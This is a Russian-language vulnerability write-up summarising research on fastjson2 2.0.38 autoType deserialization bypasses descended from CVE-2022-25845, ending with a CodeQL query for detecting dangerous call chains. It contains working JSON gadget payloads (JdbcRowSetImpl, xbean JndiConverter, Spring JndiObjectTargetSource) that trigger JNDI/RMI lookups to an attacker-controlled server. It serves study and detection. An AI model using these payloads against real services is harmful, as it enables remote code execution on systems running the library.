**CVE-2022-25845 (jinjava2 exnted) (Маджуга Богдан Андреевич)**

**Описание:**

В статье https://paper.seebug.org/3017/ автор рассматривает библиотеку fastjson2** на наличие уязвимсотей ее предшественника fastjson. В качестве уязвимости автор выбрал уязвимость отнаследованную от CVE-2022-25845, которая работала на fastjson версии *1.2.25-1.2.41*. В качестве таргета автор рассматривает fastjson2 версии *2.0.38*.


Первоначально автор пробует запустить уязвимый код напрямую из старой версии:

```
public static void main(String[] args) {
    String poc = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName":\"rmi://127.0.0.1:8085/xxx\",\"AutoCommit\":\"false\"}";
    Object obj = JSON.parse(poc, JSONReader.Feature.UseNativeObject,
    JSONReader.Feature.SupportAutoType);
    System.out.println(obj);
}
```

Как и ожидалось уязвимость не сработала, по причине того, что теперь fastjson2 блокирует выполнение checkAutoType в случае если класс связан с DataSourceName. 

```
  if (ClassLoader.class.isAssignableFrom(clazz) || JDKUtils.isSQLDataSourceOrRowSet(clazz)) {
        throw new JSONException("autoType is not support. " + typeName);
  }
```

Автор предлагает легкий способ обхода данной уязвимости используя другой тип сериализуемого объекта:

```
public static void main(String[] args) {
    String poc = "{\"@type\":\"Lorg.apache.xbean.propertyeditor.JndiConverter;\",\"asText\":\"rmi://127.0.0.1:8089/test\"}";
    Object obj = JSON.parse(poc, JSONReader.Feature.UseNativeObject,
    JSONReader.Feature.SupportAutoType);
    System.out.println(obj);
}
```

При этом автор уточняет, что для данного взлома необходима отдельная зависимость, что делает ее менее критичной:

```
<dependency> 
  <groupId>org.apache.xbean</groupId> 
  <artifactId>xbean-reflect</artifactId> 
  <version>4.15</version>
</dependency>
```

Однако, автор нашел способ вызвать аналогичную уязвимость используя популярный фреймворк Spring, что вызывает необходимость к исправлению найденной уязвимости.

```
String poc3 = "{\n" +
                "    \"@type\":\"Lorg.springframework.jndi.JndiObjectTargetSource;\",\n" +
                "    \"jndiName\": \"rmi://127.0.0.1:12312/Exp\",\n" +
                "    \"jndiTemplate\": {\n" +
                "        \"@type\":\"org.springframework.jndi.JndiTemplate\",\n" +
                "        \"environment\": {\n" +
                "            \"java.naming.factory.initial\": \"com.sun.jndi.rmi.registry.RegistryContextFactory\"\n" +
                "        }\n" +
                "    }\n" +
                "}";

JndiObjectTargetSource o = (JndiObjectTargetSource) JSON.parse(poc3, JSONReader.Feature.SupportAutoType);
o.getTarget();
```

**Причины уязвимости:**

Основная причина уязвимости заключается в том, что библиотека fastjson умеет сериализовать JSON строку сразу в объект с указанным типом *@type (JSONReader.Feature.UseNativeObject)*. При этом установка аттрибута происходит через setter методы, которые ищутся по принципу ```name.startsWith("set")``` не обращая внимание на наличие аттрибута с искомым названием. Таким образом появляется возможность вызывать методы принимающие строку на вход, смотри пример:

```
package org.example;

public class DemoObject {
    public String fieldA;
    public String fieldB;

    public void setFieldA(String fieldA) {
        this.fieldA = fieldA;
    }

    public void setFieldC(String fieldC) {
        System.out.println("Setting field C: " + fieldC);
    }
}
```

Тогда следующие код:

```
    public static void main(String[] args) {
        String poc = "{\"@type\":\"org.example.DemoObject\",\"fieldA\":\"hello A\", \"fieldB\":\"hello B\", \"fieldC\":\"hello C\"}";
        DemoObject obj = (DemoObject) JSON.parse(poc,
                JSONReader.Feature.SupportAutoType);
        System.out.println(obj.fieldA);
    }
```

Приводит к следующему выводу в консоль:

```
Setting field C: hello C
hello A
```

Как мы видем аргумент fieldB не был установлен по причине отсутсвия setter-a, а метод setFieldC - был вызван несмотря на отсутствие соответствующего аттрибута.

**QLInspector**

Проанализиурем данную уязвимость используя библиотеку QLInspector. Будем использовать стандартный запрос:

```
import java
import libs.DangerousMethods
import libs.Source


private class DangerousExpression extends Expr {
  DangerousExpression() {
    ( this instanceof Call and this.(Call).getCallee() instanceof DangerousMethod ) or
    ( this instanceof LambdaExpr and this.(LambdaExpr).getExprBody().(MethodAccess).getMethod() instanceof DangerousMethod)
  }
}

private class CallsDangerousMethod extends Callable {
  CallsDangerousMethod(){
    exists(DangerousExpression de | de.getEnclosingCallable() = this)
  }
}

private class RecursiveCallToDangerousMethod extends Callable {
  RecursiveCallToDangerousMethod(){

    not this instanceof Sanitizer and

    /*
    /* can be commented for more results
    */
    (
      getDeclaringType().getASupertype*() instanceof TypeSerializable or
      this.isStatic()
    )

    and

    (
     this instanceof CallsDangerousMethod or
    exists(RecursiveCallToDangerousMethod unsafe | this.polyCalls(unsafe))
    )
  }

    /*
    /* linking a RecursiveCallToDangerousMethod to a DangerousExpression
    */
    DangerousExpression getDangerousExpression(){
    exists(DangerousExpression de | de.getEnclosingCallable() = this and result = de ) or
    exists(RecursiveCallToDangerousMethod unsafe | this.polyCalls(unsafe) and result = unsafe.(RecursiveCallToDangerousMethod).getDangerousExpression())
    }
}


/*
*
* global filter to block function in the chain,
* method names can be added when you found a false positive
*
*/
private class Sanitizer extends Callable {
  Sanitizer(){
    hasName([""])
  }
}


query predicate edges(ControlFlowNode node1, ControlFlowNode node2) {
    (node1.(MethodAccess).getMethod().getAPossibleImplementation() = node2 and node2 instanceof RecursiveCallToDangerousMethod) or
    (node2.(MethodAccess).getEnclosingCallable() = node1 and node1 instanceof RecursiveCallToDangerousMethod)
}

predicate hasCalls(RecursiveCallToDangerousMethod c0, RecursiveCallToDangerousMethod c1) {
    c0.polyCalls(c1) or exists(RecursiveCallToDangerousMethod unsafe | c0.polyCalls(unsafe) and hasCalls(unsafe, c1))
}

from Callable source, Callable sink
where sink instanceof CallsDangerousMethod
and source.polyCalls(sink)
and sink.getFile().toString().regexpMatch(".*ObjectReaderImplObject.java")
select  source, sink, sink.getFile()
```


